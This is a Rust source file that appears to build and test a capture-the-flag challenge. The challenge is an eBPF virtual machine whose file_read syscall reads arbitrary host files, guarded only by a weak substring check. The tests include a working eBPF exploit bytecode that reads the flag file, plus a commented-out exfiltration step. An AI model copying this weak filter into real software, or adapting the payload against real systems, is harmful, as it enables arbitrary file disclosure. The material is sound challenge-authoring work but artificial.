//! Module VM.

use crate::RadError;
use rbpf::memory_region::{AccessType, MemoryMapping, MemoryRegion};
use rbpf::user_error::UserError;
use rbpf::vm::{
    EbpfVm, Executable, InstructionMeter, ProgramResult, SyscallObject, SyscallRegistry,
};

const DECODER: &[u8] = include_bytes!("../../data/decode.so");

/// Instruction meter.
struct RadMeter {
    remaining: u64,
}

impl RadMeter {
    /// Create a new meter.
    fn new() -> Self {
        Self { remaining: 1024 }
    }
}

impl InstructionMeter for RadMeter {
    fn consume(&mut self, amount: u64) {
        self.remaining -= amount;
    }

    fn get_remaining(&self) -> u64 {
        self.remaining
    }
}

/// File read syscall.
struct FileRead;

impl SyscallObject<UserError> for FileRead {
    fn call(
        &mut self,
        path: u64,
        path_size: u64,
        store_addr: u64,
        _arg4: u64,
        _arg5: u64,
        memory_mapping: &MemoryMapping,
        result: &mut ProgramResult<UserError>,
    ) {
        debug!("file_read({:x}, {:x}, {:x})", path, path_size, store_addr);

        // Assemble a path out of the argument bytes
        let mut path_bytes = path.to_le_bytes().to_vec();
        if path_size < 8 {
            path_bytes.truncate(path_size as _);
        }

        // Try to read from the path and assign into memory
        if let Ok(path) = String::from_utf8(path_bytes) {
            if !path.contains("rad") {
                if let Ok(data) = std::fs::read_to_string(&path) {
                    let data = data.into_bytes();
                    let host_store_addr = question_mark!(
                        memory_mapping.map(AccessType::Store, store_addr, data.len() as _),
                        result
                    );
                    for (i, x) in data.iter().enumerate() {
                        unsafe {
                            let p = (host_store_addr + (i as u64)) as *mut u8;
                            *p = *x;
                        }
                    }
                    *result = Ok(data.len() as _);
                    return;
                }
            }
        }

        *result = Ok(0);
    }
}

/// Send a control response.
struct SendMessage {
    data: Vec<u8>,
}

impl SyscallObject<UserError> for SendMessage {
    fn call(
        &mut self,
        load_addr: u64,
        load_size: u64,
        _arg3: u64,
        _arg4: u64,
        _arg5: u64,
        memory_mapping: &MemoryMapping,
        result: &mut ProgramResult<UserError>,
    ) {
        debug!("send_message({:x}, {:x})", load_addr, load_size);

        let mut data = vec![];
        if load_size < 64 {
            let host_load_addr = question_mark!(
                memory_mapping.map(AccessType::Store, load_addr, load_size as _),
                result
            );
            for i in 0..load_size {
                let p = (host_load_addr + i) as *const u8;
                data.push(unsafe { *p });
            }
            self.data.extend_from_slice(&data);
            *result = Ok(load_size);
            return;
        }

        *result = Ok(0);
    }
}

pub fn execute_elf(code: &[u8], memory: &mut [u8], decode: bool) -> Result<u64, RadError> {
    let code = if decode {
        decode_code(code)?
    } else {
        code.to_owned()
    };
    let exe_conf = rbpf::vm::Config::default();
    let exe = Executable::<UserError, RadMeter>::from_elf(&code, None, exe_conf)?;
    execute(exe, memory)
}

/// Execute a program.
pub fn execute_bytes(code: &[u8], memory: &mut [u8], decode: bool) -> Result<u64, RadError> {
    let code = if decode {
        decode_code(code)?
    } else {
        code.to_owned()
    };
    let exe_conf = rbpf::vm::Config::default();
    let exe = Executable::<UserError, RadMeter>::from_text_bytes(&code, None, exe_conf)?;
    execute(exe, memory)
}

/// Decode a program.
fn decode_code(encoded_code: &[u8]) -> Result<Vec<u8>, RadError> {
    let mut memory = [0u8; 256];
    let mut decoded_code = vec![];
    for i in 0..(encoded_code.len() / 8) {
        let index = i * 8;
        memory[..8].copy_from_slice(&encoded_code[index..(index + 8)]);
        let x = execute_elf(DECODER, &mut memory, false)?;
        decoded_code.push(x as u8);
    }
    Ok(decoded_code)
}

/// Execute a parsed program.
fn execute(
    mut exe: Box<dyn Executable<UserError, RadMeter>>,
    memory: &mut [u8],
) -> Result<u64, RadError> {
    let mut registry = SyscallRegistry::default();
    registry.register_syscall_by_hash(23, FileRead::call)?;
    exe.set_syscall_registry(registry);

    let region = MemoryRegion::new_from_slice(memory, 0, 32, true);
    let mut vm = EbpfVm::<UserError, RadMeter>::new(exe.as_ref(), memory, &[region])?;
    vm.bind_syscall_context_object(Box::new(FileRead {}), None)?;
    let result = vm.execute_program_interpreted(&mut RadMeter::new())?;
    Ok(result)
}

#[cfg(test)]
mod tests {
    use super::*;
    use rand::Rng;

    const FLAG: &[u8] = include_bytes!("../../FLAG");

    #[test]
    fn test_decoder() {
        let _ = env_logger::try_init();

        // Decoder is a simple best-of-seven majority voting algorithm
        let mut memory = vec![0u8; 1024];
        memory[1] = 0x01;
        memory[2] = 0x01;
        memory[3] = 0x01;
        let result = execute_elf(DECODER, &mut memory, false).expect("execute");
        assert_eq!(0x00, result);

        memory[5] = 0x01;
        let result = execute_elf(DECODER, &mut memory, false).expect("execute");
        assert_eq!(0x01, result);
    }

    #[rustfmt::skip]
    const EXPLOIT: &[u8] = &[
        // Read from /FLAG
        0x18, 0x01, 0x00, 0x00, 0x2e, 0x2e, 0x2f, 0x46,
        0x00, 0x00, 0x00, 0x00, 0x4c, 0x41, 0x47, 0x00,
        0xb7, 0x02, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
        0xb7, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x85, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00,
        // Exfil flag in message
        // 0xb7, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // 0xb7, 0x02, 0x00, 0x00, 0x3f, 0x00, 0x00, 0x00,
        // 0x85, 0x00, 0x00, 0x00, 0x2e, 0x00, 0x00, 0x00,
        // Exit
        0x95, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ];

    #[test]
    fn test_flag_read() {
        let _ = env_logger::try_init();
        let mut memory = [0xccu8; 1024];
        let result = execute_bytes(EXPLOIT, &mut memory, false).expect("execute");
        assert_eq!(FLAG.len(), result as _);
        assert_eq!(FLAG, &memory[..FLAG.len()]);
    }

    #[test]
    fn test_encoded_flag_read() {
        let _ = env_logger::try_init();
        let mut code = vec![0u8; 1024];
        for (i, x) in EXPLOIT.iter().enumerate() {
            for j in 0..8 {
                code[i * 8 + j] = *x;
            }
        }

        // debug!("{}", std::env::current_dir().expect("current_dir").display());
        std::fs::write("../data/encoded_exploit", &code).expect("write");

        let mut rng = rand::thread_rng();
        for _ in 0..256 {
            let index = rng.gen_range(0..code.len());
            let bit = rng.gen_range(0..8);
            code[index] ^= 1 << bit;
        }

        let mut memory = [0u8; 1024];
        let result = execute_bytes(&code, &mut memory, true).expect("execute");
        assert_eq!(FLAG.len(), result as _);
        assert_eq!(FLAG, &memory[..FLAG.len()]);
    }
}
